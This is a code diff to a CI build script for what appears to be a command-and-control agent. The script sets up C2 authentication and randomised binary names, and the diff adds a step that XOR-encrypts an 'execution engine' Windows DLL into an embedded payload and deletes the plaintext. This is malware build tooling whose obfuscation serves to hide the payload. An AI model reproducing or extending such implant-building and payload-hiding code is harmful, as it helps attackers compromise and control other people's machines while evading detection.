@@ -18,6 +18,25 @@ def _random_id(length: int = 8) -> str:
     return "".join(random.choices(string.hexdigits.lower(), k=length))
 
 
+def _prepare_embedded_payload(agent_dir: Path, xor_key_hex: str) -> None:
+    dll_path = agent_dir / "libjockey.dll"
+    encrypted_path = agent_dir / "libjockey.enc"
+
+    if not dll_path.is_file():
+        raise FileNotFoundError(
+            f"Missing {dll_path}. Build execution_engine as a shared Windows DLL "
+            "before running ci_build.py."
+        )
+
+    dll_bytes = dll_path.read_bytes()
+    key = bytes.fromhex(xor_key_hex)
+    encrypted_path.write_bytes(
+        bytes(value ^ key[index % len(key)] for index, value in enumerate(dll_bytes))
+    )
+    dll_path.unlink()
+    print(f"[+] Embedded payload: {len(dll_bytes)} -> {encrypted_path}")
+
+
 def main() -> int:
     parser = argparse.ArgumentParser(description="Build agent binary for CI")
     parser.add_argument("--output-dir", "-o", default="build")
@@ -35,6 +54,12 @@ def main() -> int:
     binary_path = output_dir / f"agent_{_random_id()}{suffix}"
     c2_auth = secrets.token_hex(32)
     xor_key_hex = secrets.token_hex(32)
+
+    try:
+        _prepare_embedded_payload(agent_dir, xor_key_hex)
+    except (FileNotFoundError, OSError, ValueError) as error:
+        print(f"[-] {error}", file=sys.stderr)
+        return 1
 
     env = os.environ.copy()
     env["GOOS"] = args.os
